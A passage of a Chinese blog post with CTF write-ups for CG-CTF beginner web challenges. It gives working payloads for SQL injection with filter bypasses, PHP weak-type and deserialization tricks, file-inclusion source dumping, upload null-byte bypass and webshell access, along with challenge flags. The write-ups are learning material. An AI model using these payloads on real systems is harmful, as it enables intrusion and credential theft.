<li>判断sql注入的字段数量，有两个字段。<br><code>id=-1%df&#39; order by 1%23</code>，回显正常。<br><code>id=-1%df&#39; order by 2%23</code>，回显正常。<br><code>id=-1%df&#39; order by 3%23</code>，回显错误。</li>
<li>判断哪个字段是有效字段，第二个字段有效。<br><code>id=-1%df&#39; union select 1,2%23</code>，回显2</li>
<li>爆破数据库，数据库为<code>sae-chinalover</code>。<br><code>id=-1%df&#39; union select 1,database()%23</code></li>
<li>爆破表名，表名为<code>ctf,ctf2,ctf3,ctf4,gbksqli,news</code>。<br><code>id=-1%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></li>
<li>依次爆破各个表单下的字段名，发现ctf4有列名为flag。（注意！！！：后端过滤掉了表单名）<br><code>id=-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23</code></li>
<li>最后爆破flag。<br><code>id=-1%df&#39; union select 1,flag from ctf4%23</code></li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/17.png" alt="17"></p>
<h4 id="0x15-x00（题目地址：http-teamxlc-sinaapp-com-web4-f5a14f5e6e3453b78cd73899bad98d53-index-php-）"><a href="#0x15-x00（题目地址：http-teamxlc-sinaapp-com-web4-f5a14f5e6e3453b78cd73899bad98d53-index-php-）" class="headerlink" title="0x15 /x00（题目地址：http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php ）"></a>0x15 /x00（题目地址：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a> ）</h4><p>此题考查<code>ereg()</code>函数绕过，有两种方法。<br>利用<code>%00截断</code>或<code>数组</code>绕过。</p>
<pre><code>?nctf=1%00%23biubiubiu
?nctf[]=%23biubiubiu</code></pre><p><img src="/2020/03/09/CG-CTF-WEB/18.png" alt="18"></p>
<h4 id="0x16-bypass-again（题目地址：http-chinalover-sinaapp-com-web17-index-php-）"><a href="#0x16-bypass-again（题目地址：http-chinalover-sinaapp-com-web17-index-php-）" class="headerlink" title="0x16 bypass again（题目地址：http://chinalover.sinaapp.com/web17/index.php ）"></a>0x16 bypass again（题目地址：<a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php</a> ）</h4><p>此题和0x02相似，都是考察PHP弱类型。<br>有两种解法：</p>
<pre><code>?a=240610708&amp;b=QNKCDZO  #利用哈希值。
?a[]=&amp;b[]=111           #利用md5()不能处理数组。</code></pre><p><img src="/2020/03/09/CG-CTF-WEB/19.png" alt="19"></p>
<h4 id="0x17-变量覆盖（题目地址：http-chinalover-sinaapp-com-web18-index-php-）"><a href="#0x17-变量覆盖（题目地址：http-chinalover-sinaapp-com-web18-index-php-）" class="headerlink" title="0x17 变量覆盖（题目地址：http://chinalover.sinaapp.com/web18/index.php ）"></a>0x17 变量覆盖（题目地址：<a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web18/index.php</a> ）</h4><pre><code>&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;
                  &lt;?php
                  extract($_POST);
                  if ($pass == $thepassword_123) { ?&gt;
                      &lt;div class=&quot;alert alert-success&quot;&gt;
                          &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
                      &lt;/div&gt;
                  &lt;?php } ?&gt;
              &lt;?php } ?&gt;</code></pre><p>extract()函数的$extract_type缺省值为1，若没有另外指定，函数将覆盖已有变量。<br>所以传入<code>pass</code>和<code>thepassword_123</code>相等即可。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/21.png" alt="21"></p>
<h4 id="0x18-PHP是世界上最好的语言（die！）"><a href="#0x18-PHP是世界上最好的语言（die！）" class="headerlink" title="0x18 PHP是世界上最好的语言（die！）"></a>0x18 PHP是世界上最好的语言（die！）</h4><h4 id="0x19-伪装者（http-chinalover-sinaapp-com-web4-xxx-php-）"><a href="#0x19-伪装者（http-chinalover-sinaapp-com-web4-xxx-php-）" class="headerlink" title="0x19 伪装者（http://chinalover.sinaapp.com/web4/xxx.php ）"></a>0x19 伪装者（<a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web4/xxx.php</a> ）</h4><p>根据题目意思，需要伪装在本地登陆。可能要用到<code>client-ip</code>或者<code>x-forwarded-for</code>。<br>截包，添加字段<code>client-ip:127.0.0.1</code>。获得flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/20.png" alt="20"></p>
<h4 id="0x20-Header（die！）"><a href="#0x20-Header（die！）" class="headerlink" title="0x20 Header（die！）"></a>0x20 Header（die！）</h4><h4 id="0x21-上传绕过（题目地址：http-teamxlc-sinaapp-com-web5-21232f297a57a5a743894a0e4a801fc3-index-html-）"><a href="#0x21-上传绕过（题目地址：http-teamxlc-sinaapp-com-web5-21232f297a57a5a743894a0e4a801fc3-index-html-）" class="headerlink" title="0x21 上传绕过（题目地址：http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html ）"></a>0x21 上传绕过（题目地址：<a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html</a> ）</h4><p>首先随便上传一个文件，提示要上传<code>jpg,gif,png后缀的文件</code>，再上传<code>.jpg</code>文件，又要求上传<code>.php</code>文件，上传<code>.php</code>时，又出了问题。</p>
<p>首先，手动构造一个<code>1.php.jpg</code>文件，然后抓包。利用<code>00</code>截断上传绕过。</p>
<p>原理：00截断是文件后缀名就一个%00字节，可以截断某些函数对文件名的判断，在许多语言函数中，处理字符串的函数中0x00被认为是终止符。</p>
<p>在二进制编码中找到文件的位置，将php后面的值改为<code>00</code>，然后GO一下就得到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/22.png" alt="22"></p>
<h4 id="0x22、SQL注入1（题目地址：http-chinalover-sinaapp-com-index-php-）"><a href="#0x22、SQL注入1（题目地址：http-chinalover-sinaapp-com-index-php-）" class="headerlink" title="0x22、SQL注入1（题目地址：http://chinalover.sinaapp.com/index.php ）"></a>0x22、SQL注入1（题目地址：<a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.php</a> ）</h4><p>题目给出源代码：</p>
<pre><code>&lt;?php
if($_POST[user] &amp;&amp; $_POST[pass]) {
        mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
    mysql_select_db(SAE_MYSQL_DB);
    $user = trim($_POST[user]);
    $pass = md5(trim($_POST[pass]));
    $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;
        echo &apos;&lt;/br&gt;&apos;.$sql;
    $query = mysql_fetch_array(mysql_query($sql));
    if($query[user]==&quot;admin&quot;) {
          echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;
    }
    if($query[user] != &quot;admin&quot;) {
        echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);
    }
}
echo $query[user];
?&gt;</code></pre><p>此题为SQL注入，主要在于拼接sql语句的时候能够查询出user为admin的结果，此处只需要闭合user参数并注释掉后面的语句即可。</p>
<p>构造payload：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/23.png" alt="23"></p>
<p>拿到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/24.png" alt="24"></p>
<h4 id="0x23、pass-check（题目地址：http-chinalover-sinaapp-com-web21-）"><a href="#0x23、pass-check（题目地址：http-chinalover-sinaapp-com-web21-）" class="headerlink" title="0x23、pass check（题目地址：http://chinalover.sinaapp.com/web21/ ）"></a>0x23、pass check（题目地址：<a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a> ）</h4><p>题目给出了源代码：</p>
<pre><code>$pass=@$_POST[&apos;pass&apos;];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo &quot;flag:nctf{*}&quot;;
}else{
echo &quot;the pass is wrong!&quot;;
}
}else{
echo &quot;please input pass!&quot;;
}
?&gt;</code></pre><p>考察<code>strcmp()</code>弱类型，传入数组时会返回null。所以<code>post</code>的数据为<code>pass[]=1</code>可以获取flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/25.png" alt="25"></p>
<h4 id="0x24、起名字真难（题目地址：http-chinalover-sinaapp-com-web12-index-php-）"><a href="#0x24、起名字真难（题目地址：http-chinalover-sinaapp-com-web12-index-php-）" class="headerlink" title="0x24、起名字真难（题目地址：http://chinalover.sinaapp.com/web12/index.php ）"></a>0x24、起名字真难（题目地址：<a href="http://chinalover.sinaapp.com/web12/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php</a> ）</h4><p>题目给出了源码：</p>
<pre><code>&lt;?php
function noother_says_correct($number)
{
    $one = ord(&apos;1&apos;);
       $nine = ord(&apos;9&apos;);
       for ($i = 0; $i &lt; strlen($number); $i++)
       {   
               $digit = ord($number{$i});
               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
              {
                      return false;
             }
       }
       return $number == &apos;54975581388&apos;;
}
$flag=&apos;*******&apos;;
if(noother_says_correct($_GET[&apos;key&apos;]))
   echo $flag;
else 
   echo &apos;access denied&apos;;
?&gt;</code></pre><p>分析源码可得知：传入<code>key</code>的值中不能包含<code>1-9</code>的数字，但要和<code>54975581388</code>相等，此处转化为十六进制<code>0xccccccccc</code>即可获取到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/26.png" alt="26"></p>
<h4 id="0x25、密码重置（题目地址：-http-nctf-nuptzj-cn-web13-index-php-user1-Y3RmdXNlcg-）"><a href="#0x25、密码重置（题目地址：-http-nctf-nuptzj-cn-web13-index-php-user1-Y3RmdXNlcg-）" class="headerlink" title="0x25、密码重置（题目地址：(http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==) ）"></a>0x25、密码重置（题目地址：(<a href="http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==</a>) ）</h4><p>在<code>post</code>传参时发现还有<code>get</code>传参的<code>user1</code>，初始值为<code>ctfuser</code>经过<code>base64编码</code>的值，题目要求修改<code>user=admin</code>的密码，所以将<code>user1</code>的值改为<code>admin</code>的<code>base64编码</code>加密后的值<code>YWRtaW4=</code>，<code>user</code>的值改为<code>admin</code>。即可获取flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/27.png" alt="27"><br><img src="/2020/03/09/CG-CTF-WEB/28.png" alt="28"></p>
<h4 id="0x26、php-反序列化（题目地址：http-4-chinalover-sinaapp-com-web25-index-php-）"><a href="#0x26、php-反序列化（题目地址：http-4-chinalover-sinaapp-com-web25-index-php-）" class="headerlink" title="0x26、php 反序列化（题目地址：http://4.chinalover.sinaapp.com/web25/index.php ）"></a>0x26、php 反序列化（题目地址：<a href="http://4.chinalover.sinaapp.com/web25/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web25/index.php</a> ）</h4><p>题目给出源代码：</p>
<pre><code>&lt;?php
class just4fun {
  var $enter;
 var $secret;
}

if (isset($_GET[&apos;pass&apos;])) {
 $pass = $_GET[&apos;pass&apos;];

 if(get_magic_quotes_gpc()){
      $pass=stripslashes($pass);
  }

  $o = unserialize($pass);

 if ($o) {
     $o-&gt;secret = &quot;*&quot;;
        if ($o-&gt;secret === $o-&gt;enter)
          echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
       else 
           echo &quot;Oh no... You can&apos;t fool me&quot;;
    }
    else echo &quot;are you trolling?&quot;;
?&gt;</code></pre><p>本题考点在于反序列化后，secret会被重新赋值为一个未知的值，但要求enter跟secret的值一致才能拿到flag。<br>这里主要考察一个知识点：对象包含的引用在序列化时也会被存储。<br>我们通过将secret的引用赋值给enter，这样就可以同步变化，绕过验证。</p>
<p>编写脚本：</p>
<pre><code>&lt;?php
class just4fun {
  var $enter;
 var $secret;
}

$exp = new just4fun();
$exp -&gt; enter = &amp;$exp -&gt; secret;
$pass = serialize($exp);
print_r($pass);
?&gt;</code></pre><p>得到payload：<code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code></p>
<p>但是没有flag。题目提示目前没法做，可能就是原因。</p>
<h4 id="0x27、SQL-Injection（题目地址：http-chinalover-sinaapp-com-web15-index-php-）"><a href="#0x27、SQL-Injection（题目地址：http-chinalover-sinaapp-com-web15-index-php-）" class="headerlink" title="0x27、SQL Injection（题目地址：http://chinalover.sinaapp.com/web15/index.php ）"></a>0x27、SQL Injection（题目地址：<a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a> ）</h4><p>题目提示：<code>TIP:反斜杠可以用来转义 仔细查看相关函数的用法。</code></p>
<p>用<code>view-source</code>查看源码。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/29.png" alt="29"></p>
<p><code>stripslashes</code>函数用于去掉<code>\</code>，返回一个去除转义反斜线后的字符串（\‘ 转换为 ‘ 等等）。双反斜线（\\）被转换为单个反斜线（\）。 </p>
<p><code>htmlentities — 将字符转换为 HTML 转义字符</code></p>
<p>由于<code>htmllentities</code>函数会使<code>&#39;</code>失效，所以我们无法闭合源代码中的<code>&#39;</code>，根据题目提示灵活使用转义字符<code>\</code>。</p>
<p>拿出SQL注入语句<code>&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;</code>来分析。</p>
<p>首先name=后面的’&#39;‘将第一个<code>&#39;</code>转移，剩下的<code>&#39;</code>作为语句开头。</p>
<p>接下来到了问题关键处，pass=后面只能转义一个<code>&#39;</code>，所以剩下的那个<code>&#39;</code>只能作为语句的闭合标志。因此我们需要将$username后面的<code>&#39;</code>全部转义。这里就要用到’&#39;。</p>
<p>接下来就简单了，构造payload：<code>?username=admin \&amp;password=or 1=1%23</code></p>
<p>传入的SQL语句变为：<br><code>SELECT * FROM users WHERE name=&#39;admin \&#39; AND pass=&#39; or 1=1</code></p>
<p>得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/30.png" alt="30"></p>
<h4 id="0x28、综合题（题目地址：http-teamxlc-sinaapp-com-web3-b0b0ad119f425408fc3d45253137d33d-index-php-）"><a href="#0x28、综合题（题目地址：http-teamxlc-sinaapp-com-web3-b0b0ad119f425408fc3d45253137d33d-index-php-）" class="headerlink" title="0x28、综合题（题目地址：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php ）"></a>0x28、综合题（题目地址：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a> ）</h4><p>进入题目出现一堆代码，经查看后，是jsfuck，可以直接丢进控制台运行。得到<code>1bc29b36f623ba82aaf6724fd3b16718.php</code>，查看这个文件，提示TIP在脑袋里。<br>脑袋———header，在header中找到tip</p>
<p><img src="/2020/03/09/CG-CTF-WEB/31.png" alt="31"></p>
<p>提示<code>history of bash</code>，是指让我们去查看根目录下的<code>.bash_history</code>文件。</p>
<p>得到压缩命令：<code>zip -r flagbak.zip ./*</code></p>
<p>我们下载<code>flagbak.zip</code>文件，找到其中的<code>flag.txt</code>文件打开得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/32.png" alt="32"></p>
<h4 id="0x29-system（die！）"><a href="#0x29-system（die！）" class="headerlink" title="0x29 system（die！）"></a>0x29 system（die！）</h4><h4 id="0x30-SQL注入2（题目地址：http-4-chinalover-sinaapp-com-web6-index-php-）"><a href="#0x30-SQL注入2（题目地址：http-4-chinalover-sinaapp-com-web6-index-php-）" class="headerlink" title="0x30 SQL注入2（题目地址：http://4.chinalover.sinaapp.com/web6/index.php ）"></a>0x30 SQL注入2（题目地址：<a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web6/index.php</a> ）</h4><p>首先查看题目给出的源码：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/33.png" alt="33"></p>
<p>分析代码：</p>
<ul>
<li>题目提示主要考察union查询</li>
<li>用post方法传入user和pass变量。</li>
<li>传入的pass变量经过md5()加密。</li>
<li>query[pw]中储存的是结果。</li>
<li>如果query[pw]中的结果与pass相等，即可得到flag</li>
<li>既然我们不知道结果中有什么，那么就构造一个结果来利用。</li>
</ul>
<p>构造payload：</p>
<pre><code>user=&apos;union select md5(1)#    #开头&apos;用于闭合user前面的&apos;，后面的#用于注释掉后面的&apos;
pass=1                        #对应md5(1)</code></pre><p><img src="/2020/03/09/CG-CTF-WEB/34.png" alt="34"></p>
<h4 id="0x31综合题2（题目地址：http-cms-nuptzj-cn-）"><a href="#0x31综合题2（题目地址：http-cms-nuptzj-cn-）" class="headerlink" title="0x31综合题2（题目地址：http://cms.nuptzj.cn/ ）"></a>0x31综合题2（题目地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">http://cms.nuptzj.cn/</a> ）</h4><p>进入题目是一块留言板，先随便玩玩。</p>
<p>先来看留言搜索，输入1试试，</p>
<p><img src="/2020/03/09/CG-CTF-WEB/43.png" alt="43"></p>
<p>提示“只有用本公司开发的的浏览器”，猜想可能用到<code>user-agent</code>，但是我们并不知道到底是什么浏览器，所以继续往下看。</p>
<p>接下来看留言，猜想此处可能存在<code>xss</code>或<code>sql</code>注入，先随便输入试试。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/44.png" alt="44"></p>
<p>出题人说自己也不会<code>xss</code>，所以排除xss。</p>
<p>确认提交后，提示页码源代码中有惊喜！</p>
<p>我们用<code>view-source</code>查看网页源码，在第58行，发现<code>&quot;./about.php?file=sm.txt&quot;</code>。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/45.png" alt="45"></p>
<p>点开后，我们可以看到<code>sm.txt</code>文件的内容，很明显，此题存在<code>文件包含</code>漏洞。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/46.png" alt="46"></p>
<p><code>sm.txt</code>文件中给出了两个提示：</p>
<ul>
<li>一个是<code>admin表结构 create table admin ( id integer, username text, userpass text, )</code>这更加坚定了存在SQL注入。然后也没有什么有用的信息了。</li>
<li>另一个是许多文件： config.php，index.php，passencode.php，say.php，不要忘了还有about.php。</li>
</ul>
<p>再次返回留言板，最底部还有一个<code>本CMS说明</code>可以打开。还是<code>sm.txt</code></p>
<p>现在我们可以利用文件包含漏洞读取上面找出的文件，先查看<code>index.php</code>。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/47.png" alt="47"></p>
<p>这样的代码可读性很差，我们可以利用<code>python</code>中的<code>BeautifulSoup</code>库来整理代码。编写脚本：</p>
<pre><code>import requests
from bs4 import BeautifulSoup

url = &quot;http://cms.nuptzj.cn/about.php?file=&quot;
file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;config.php&quot;,&quot;say.php&quot;,&quot;so.php&quot;&quot;about.php&quot;]

for i in file_list:
    r = requests.get(url+i)
    print(&quot;download&quot;+i)
    if r.status_code==200:
        r.encoding = &quot;utf-8&quot;
    r = BeautifulSoup(r.text,&quot;html.parser&quot;)
    print(r)</code></pre><p>关于<code>BeautifulSoup库</code>的使用可以参考我的另一篇blog–<code>Python-requests 模块学习</code>的相关连接。</p>
<p>先看index.php:</p>
<pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;?php
$file=$_GET[&apos;file&apos;];
if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;)){
    echo &quot;file参数不能为空！&quot;;
    exit();
}else{
    $cut=strchr($file,&quot;loginxlcteam&quot;);
    if($cut==false){
    $data=file_get_contents($file);
    $date=htmlspecialchars($data);
    echo $date;
    }else{
        echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;;
    }
}</code></pre><p>发现<code>config.php</code>和<code>loginxlcteam</code>。我们看看这个<code>loginxlcteam</code>是什么。</p>
<p>发现Xlcteam留言板系统后台登录。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/48.png" alt="48"></p>
<p>不出意外，应该就是在这里SQL注入，但是条件还没有成熟。</p>
<p>此时想到之前<code>so.php</code>中提到只有本公司开发的浏览器才能用。我们来查看<code>so.php</code>中的内容。</p>
<pre><code>&lt;?php
if($_SERVER[&apos;HTTP_USER_AGENT&apos;]!=&quot;Xlcteam Browser&quot;){
echo &apos;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&apos;;
    exit();
}
$id=$_POST[&apos;soid&apos;];
include &apos;config.php&apos;;
include &apos;antiinject.php&apos;;
include &apos;antixss.php&apos;;
$id=antiinject($id);
$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());
mysql_select_db($db_name,$con);
$id=mysql_real_escape_string($id);
$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);
$rs=mysql_fetch_array($result);
echo htmlspecialchars($rs[&apos;nice&apos;]).&apos;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;.antixss($rs[&apos;say&apos;]).&apos;&lt;br /&gt;&apos;;
mysql_free_result($result);
mysql_free_result($file);
mysql_close($con);
?&gt;</code></pre><h5 id="！这里才是SQL注入的地方"><a href="#！这里才是SQL注入的地方" class="headerlink" title="！这里才是SQL注入的地方"></a>！这里才是SQL注入的地方</h5><p>第2行代码，推出当<code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]==&quot;Xlcteam Browser&quot;</code>才可以通过。接着往下看，第8行有防止SQL注入的<code>antiinject.php</code>文件。</p>
<p>查看<code>antiinject.php</code>文件。</p>
<pre><code>&lt;?php
function antiinject($content) {
    $keyword = array(&quot;select&quot;, &quot;union&quot;, &quot;and&quot;, &quot;from&quot;, &apos; &apos;, &quot;&apos;&quot;, &quot;;&quot;, &apos;&quot;&apos;, &quot;char&quot;, &quot;or&quot;, &quot;count&quot;, &quot;master&quot;, &quot;name&quot;, &quot;pass&quot;, &quot;admin&quot;, &quot;+&quot;, &quot;-&quot;, &quot;order&quot;, &quot;=&quot;);
    $info = strtolower($content);
    for ($i = 0;$i &lt;= count($keyword);$i++) {
        $info = str_replace($keyword[$i], &apos;&apos;, $info);
    }
    return $info;
}
?&gt;</code></pre><p>发现了文件中过滤了很多关键字。我们可以通过双写绕过或者<code>=</code>绕过，空格可以用<code>/**/</code>绕过。</p>
<h5 id="开始SQL注入"><a href="#开始SQL注入" class="headerlink" title="开始SQL注入"></a>开始SQL注入</h5><ul>
<li>首先注意在header中将<code>User-Agent</code>设置为<code>Xlcteam Browser</code>。</li>
<li>先找出有效的注入字段，payload：<code>soid=0/**/an=d/**/1/**/uni=on/**/sele=ct/**/1,2,3,4</code>，回显2和3，说明2，3处可以注入。</li>
<li>之前我们已经知道了admin表的结果，所以直接注入。payload：<code>soid=0/**/an=d/**/1/**/uni=on/**/sele=ct/**/1,2,(sele=ct/**/group_concat(userp=ass)/**/fr=om/**/adm=in),4</code>。</li>
<li>回显<code>102 117 99 107 114 117 110 116 117</code>，这是userpass的ASCII编码，解码得<code>fuckruntu</code>。</li>
<li>我们去后台登录。</li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/49.png" alt="49"></p>
<p>接下来考察一句话木马，提供了文件名，查看文件。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/50.png" alt="50"></p>
<p>直接使用蚁剑：</p>
<pre><code>url : http://cms.nuptzj.cn/xlcteam. php?www=preg_replace
pass : wtf</code></pre><p>查看后台文件，即可获得flag。</p>
<h4 id="0x32密码重置2（题目地址：http-nctf-nuptzj-cn-web14-index-php-）"><a href="#0x32密码重置2（题目地址：http-nctf-nuptzj-cn-web14-index-php-）" class="headerlink" title="0x32密码重置2（题目地址：http://nctf.nuptzj.cn/web14/index.php ）"></a>0x32密码重置2（题目地址：<a href="http://nctf.nuptzj.cn/web14/index.php" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web14/index.php</a> ）</h4><pre><code>TIPS:
1.管理员邮箱观察一下就可以找到
2.linux下一般使用vi编辑器，并且异常退出会留下备份文件
3.弱类型bypass</code></pre><p>先了解Linux下的备份文件：</p>
<pre><code>vim的特性，自动备份：

一、vim备份文件

     默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；

    eg:index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~

二、vim临时文件

    vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件

 .submit.swp。如果文件正常退出，则此文件自动删除。</code></pre><ul>
<li>需要用post方式传入email和token。</li>
<li>先找email，F12源码中找到管理员邮箱<code>admin@nuptzj.cn</code>。</li>
<li>再找token，在<code>.submit.php.swp</code>文件下发现源码。</li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/35.png" alt="35"></p>
<ul>
<li>分析源码可知：token必须等于0，长度必须为10，可以推出<code>token=0000000000</code>。</li>
<li>最后传入<code>email</code>和<code>token</code>。</li>
<li>得到<code>flag:nctf{thanks_to_cumt_bxs}</code></li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/36.png" alt="36"></p>
<h4 id="0x33-file-get-contents（题目地址：http-chinalover-sinaapp-com-web23-）"><a href="#0x33-file-get-contents（题目地址：http-chinalover-sinaapp-com-web23-）" class="headerlink" title="0x33 file_get_contents（题目地址：http://chinalover.sinaapp.com/web23/ ）"></a>0x33 file_get_contents（题目地址：<a href="http://chinalover.sinaapp.com/web23/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web23/</a> ）</h4><p>什么都没有，<code>view-soure</code>查看源码。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/37.png" alt="37"></p>
<p>先了解<code>file_get_contents()</code>函数。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/38.png" alt="38"></p>
<p>绕过<code>file_get_contents()</code>函数共有两种方法：<br>一、使用Data URI scheme (data: base64) 协议。</p>
<pre><code> #常用格式有：
 1、 data:,&lt;文本数据&gt;  
 2、 data:text/plain,&lt;文本数据&gt;  
 3、 data:text/html,&lt;HTML代码&gt;  
 4、 data:text/html;base64,&lt;base64编码的5、HTML代码&gt;  
 6、 data:text/css,&lt;CSS代码&gt;  
 7、 data:text/css;base64,&lt;base64编码的CSS代码&gt;  
 8、 data:text/javascript,&lt;Javascript代码&gt;  
 9、 data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;  
10、data:image/gif;base64,base64编码的gif图片数据  
11、data:image/png;base64,base64编码的png图片数据  
12、data:image/jpeg;base64,base64编码的jpeg图片数据  
13、data:image/x-icon;base64,base64编码的icon图片数据</code></pre><p>构造payload：</p>
<pre><code>?file=data:,meizijiu
?file=data:text/plain,meizijiu</code></pre><p>二、二、使用伪协议<code>php://input</code>，再通过<code>POST</code>方法传入<code>&quot;meizijiu&quot;</code></p>
<p>构造payload：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/39.png" alt="39"></p>
<p>得到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/40.png" alt="40"></p>
<h4 id="0x34-变量覆盖（题目地址：http-chinalover-sinaapp-com-web24-）"><a href="#0x34-变量覆盖（题目地址：http-chinalover-sinaapp-com-web24-）" class="headerlink" title="0x34 变量覆盖（题目地址：http://chinalover.sinaapp.com/web24/ ）"></a>0x34 变量覆盖（题目地址：<a href="http://chinalover.sinaapp.com/web24/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web24/</a> ）</h4><p>先用<code>view-source</code>查看源码</p>
<p><img src="/2020/03/09/CG-CTF-WEB/41.png" alt="41"></p>
<p>只需要<code>name==&quot;meizijiu233&quot;</code>即可得到flag。</p>
<p>利用<code>$$key=$value</code>，传入<code>name=meizijiu233</code>可以覆盖掉<code>name</code>原来的值，使条件成立。</p>
<p>payload：<code>?name=meizijiu233</code></p>
<p><img src="/2020/03/09/CG-CTF-WEB/42.png" alt="42"></p>
<h4 id="0x35-注意（直接提供flag）"><a href="#0x35-注意（直接提供flag）" class="headerlink" title="0x35 注意（直接提供flag）"></a>0x35 注意（直接提供flag）</h4><hr>
<hr>
<h3 id="写在后面："><a href="#写在后面：" class="headerlink" title="写在后面："></a>写在后面：</h3><pre><code>这些题目只是web入门级别的，接下来就要向更难的题目进发！！！</code></pre>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CG-CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Cosmos的留言板-1</title>
    <url>/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/</url>
